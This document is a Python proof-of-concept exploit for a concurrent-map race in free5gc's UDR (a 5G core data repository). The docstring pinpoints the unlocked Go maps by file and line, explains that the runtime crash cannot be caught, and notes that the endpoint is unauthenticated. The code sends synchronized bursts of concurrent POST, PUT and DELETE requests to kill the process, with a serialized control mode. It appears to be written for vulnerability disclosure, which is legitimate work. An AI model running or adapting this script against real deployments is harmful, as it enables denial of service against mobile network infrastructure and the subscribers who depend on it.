#!/usr/bin/env python3
"""
udr_race.py -- PoC for the free5gc UDR SBI concurrent-map race (CWE-362 -> CWE-366).

free5gc's UDR keeps its notification subscriptions in two PLAIN Go maps on the
singleton UDR context:

    internal/context/context.go:67   SubscriptionDataSubscriptions map[subsId]*...
    internal/context/context.go:68   PolicyDataSubscriptions       map[subsId]*...

Every SBI request is served on its own gin goroutine, and the handlers touch
those maps with no mutex at all. Line numbers are given for BOTH audited
commits -- `default.go` at the deployed v4.2.2 UDR commit 8a1d3c63 (which is
what the crash stacks in crash/ name), the other two files at UDR main HEAD
db69aa0 (the deployed equivalents are in parentheses):

    internal/sbi/processor/default.go:183   read  PolicyDataSubscriptionIDGenerator
    internal/sbi/processor/default.go:184   WRITE PolicyDataSubscriptions[id]
    internal/sbi/processor/default.go:185   write PolicyDataSubscriptionIDGenerator++
    internal/sbi/processor/default.go:198   read  PolicyDataSubscriptions[subsId]
    internal/sbi/processor/default.go:205   DELETE PolicyDataSubscriptions
    (at main HEAD db69aa0 the same five sites are :183/:193/:197/:210+:225+:233/:217)
    internal/sbi/processor/subs_to_notify_collection.go:38  WRITE SubscriptionDataSubscriptions
                                                            (deployed 8a1d3c63: :29)
    internal/sbi/processor/subs_to_notify_document.go:25/33 read/DELETE SubscriptionDataSubscriptions
                                                            (identical at both commits)
    internal/sbi/processor/callback.go:111/160  ITERATE both maps
                                                            (deployed 8a1d3c63: :92/:127)

A concurrent write/write, read/write or iterate/write on a plain Go map makes
the runtime call runtime.throw("concurrent map writes" /
"concurrent map read and map write"). That is NOT a panic: it cannot be caught
by gin's Recovery middleware or by any recover(), and it aborts the whole UDR
process with exit status 2.

Reachability: the UDR SBI is plain HTTP (config/udrcfg.yaml: scheme http,
port 8000) and the authorization middleware is a no-op when OAuth2 is not
configured, so POST /nudr-dr/v2/policy-data/subs-to-notify is reachable
unauthenticated from any host that can route to the UDR.

The deployed v4.2.2 handler additionally forgets to `return` after writing the
400 problem-details body (internal/sbi/api_datarepository.go,
HandlePolicyDataSubsToNotifyPost), so the racy map write executes even when the
request body cannot be deserialized. That makes the body content irrelevant:
any POST reaches the write.

Usage
-----
    ./udr_race.py --target 10.100.200.11 --port 8000            # race mode
    ./udr_race.py --target 10.100.200.11 --port 8000 --serialize # negative control
    ./udr_race.py --target 10.100.200.11 --port 8000 --mode mixed

Exit status: 0 = UDR killed, 1 = survived all rounds, 2 = usage/connection error.
"""

import argparse
import http.client
import json
import socket
import sys
import threading
import time

POLICY_PATH = "/nudr-dr/v2/policy-data/subs-to-notify"
SUBSDATA_PATH = "/nudr-dr/v2/subscription-data/subs-to-notify"

# The v4.2.2 handler calls openapi.Deserialize(policyDataSubscription, ...)
# with a NON-pointer, so deserialization always fails with 400; because the
# handler does not return, the processor (and therefore the map write) still
# runs. A syntactically valid body is sent anyway so the PoC also works on
# builds where that Deserialize bug is fixed.
BODY = json.dumps({
    "notificationUri": "http://127.0.0.1:9/never",
    "monitoredResourceUris": ["http://127.0.0.1:9/x"],
    "contextIdList": [],
    "nfTypeList": [],
    "supportedFeatures": "FFFF",
}).encode()

SUBSDATA_BODY = json.dumps({
    "nfInstanceID": "00000000-0000-0000-0000-000000000000",
    "plmnId": {"mcc": "208", "mnc": "93"},
    "callbackReference": "http://127.0.0.1:9/never",
    "monitoringEventIds": [],
}).encode()


def log(msg):
    sys.stderr.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
    sys.stderr.flush()


class Conn:
    """One persistent HTTP/1.1 connection per worker thread."""

    def __init__(self, host, port, timeout):
        self.host, self.port, self.timeout = host, port, timeout
        self.c = None
        self.connect()

    def connect(self):
        self.c = http.client.HTTPConnection(self.host, self.port,
                                           timeout=self.timeout)

    def send(self, method, path, body):
        hdr = {"Content-Type": "application/json",
               "Content-Length": str(len(body)),
               "Connection": "keep-alive"}
        try:
            self.c.request(method, path, body=body, headers=hdr)
            r = self.c.getresponse()
            r.read()
            return r.status
        except Exception:
            # The UDR died mid-request; reconnect so later probes still work.
            try:
                self.c.close()
            except Exception:
                pass
            self.connect()
            return None


def udr_alive(host, port, timeout=2.0):
    """Cheap liveness probe: any HTTP response at all means the process is up."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(b"GET /nudr-dr/v2/policy-data/subs-to-notify HTTP/1.1\r\n"
                  b"Host: x\r\nConnection: close\r\n\r\n")
        data = s.recv(16)
        return len(data) > 0
    except Exception:
        return False
    finally:
        s.close()


def fire(conns, barrier, plan):
    """Release all workers at once. plan[i] = (method, path, body)."""
    out = [None] * len(conns)

    def worker(i):
        m, p, b = plan[i]
        barrier.wait()
        out[i] = conns[i].send(m, p, b)

    ts = [threading.Thread(target=worker, args=(i,)) for i in range(len(conns))]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return out


def build_plan(concurrency, mode, seq):
    """A barrier-aligned burst of requests against the racy maps."""
    plan = []
    for i in range(concurrency):
        if mode == "post":
            plan.append(("POST", POLICY_PATH, BODY))
        elif mode == "subsdata":
            plan.append(("POST", SUBSDATA_PATH, SUBSDATA_BODY))
        else:  # mixed: writers + readers + deleters on the same map
            r = (seq + i) % 4
            if r == 0:
                plan.append(("DELETE", POLICY_PATH + "/0", b""))
            elif r == 1:
                plan.append(("PUT", POLICY_PATH + "/0", BODY))
            elif r == 2:
                plan.append(("POST", SUBSDATA_PATH, SUBSDATA_BODY))
            else:
                plan.append(("POST", POLICY_PATH, BODY))
    return plan


def main():
    ap = argparse.ArgumentParser(
        description="free5gc UDR SBI concurrent-map race PoC (CWE-362 -> exit 2)")
    ap.add_argument("--target", default="10.100.200.11",
                    help="UDR SBI IPv4 address (default: %(default)s)")
    ap.add_argument("--port", type=int, default=8000,
                    help="UDR SBI port (default: %(default)s)")
    ap.add_argument("--concurrency", type=int, default=64,
                    help="simultaneous requests per round (default: %(default)s)")
    ap.add_argument("--rounds", type=int, default=200,
                    help="max rounds before giving up (default: %(default)s)")
    ap.add_argument("--mode", choices=["post", "mixed", "subsdata"],
                    default="post",
                    help="post = write/write only; mixed = write+read+delete "
                         "on both maps; subsdata = the SubscriptionData map")
    ap.add_argument("--serialize", action="store_true",
                    help="NEGATIVE CONTROL: same request count and mix, but "
                         "strictly one at a time. Must never kill the UDR.")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--settle", type=float, default=0.05,
                    help="pause between rounds (default: %(default)s)")
    ap.add_argument("--probe-after", type=float, default=2.0,
                    help="how long to keep probing once the UDR stops answering")
    args = ap.parse_args()

    log("target      : http://%s:%d" % (args.target, args.port))
    log("mode        : %s%s" % (args.mode, "  [SERIALIZED CONTROL]"
                                if args.serialize else ""))
    log("concurrency : %d   rounds: %d" % (args.concurrency, args.rounds))

    if not udr_alive(args.target, args.port):
        log("ERROR: UDR is not answering before we start -- nothing to prove")
        return 2

    log("UDR alive before attack: YES")

    conns = []
    try:
        for _ in range(args.concurrency):
            conns.append(Conn(args.target, args.port, args.timeout))
    except Exception as e:
        log("ERROR: cannot open %d connections: %s" % (args.concurrency, e))
        return 2
    log("opened %d persistent connections" % len(conns))

    total_requests = 0
    t0 = time.time()
    killed_round = None

    for seq in range(1, args.rounds + 1):
        plan = build_plan(args.concurrency, args.mode, seq)

        if args.serialize:
            # Control: identical bytes, identical volume, no concurrency.
            barrier = threading.Barrier(1)
            for i in range(len(conns)):
                conns[i].send(*plan[i])
        else:
            barrier = threading.Barrier(len(conns))
            fire(conns, barrier, plan)

        total_requests += len(plan)

        if not udr_alive(args.target, args.port, timeout=1.0):
            # Confirm it is really gone, not just briefly busy.
            deadline = time.time() + args.probe_after
            still_down = True
            while time.time() < deadline:
                if udr_alive(args.target, args.port, timeout=1.0):
                    still_down = False
                    break
                time.sleep(0.2)
            if still_down:
                killed_round = seq
                log("*** UDR STOPPED ANSWERING at round %d (%d requests, "
                    "%.2fs) ***" % (seq, total_requests, time.time() - t0))
                break
            else:
                # transient: rebuild connections and carry on
                for j in range(len(conns)):
                    conns[j].connect()

        if args.settle:
            time.sleep(args.settle)

        if seq % 25 == 0:
            log("round %d/%d done, %d requests sent, UDR still alive"
                % (seq, args.rounds, total_requests))

    elapsed = time.time() - t0

    print("=== udr_race result ===")
    print("target            : %s:%d" % (args.target, args.port))
    print("mode              : %s%s" % (args.mode,
                                       " [SERIALIZED CONTROL]"
                                       if args.serialize else ""))
    print("concurrency       : %d" % args.concurrency)
    print("rounds run        : %d" % (killed_round or seq))
    print("requests sent     : %d" % total_requests)
    print("elapsed seconds   : %.2f" % elapsed)
    print("udr killed        : %s" % ("YES" if killed_round else "NO"))
    if killed_round:
        print("killed at round   : %d" % killed_round)
    return 0 if killed_round else 1


if __name__ == "__main__":
    sys.exit(main())
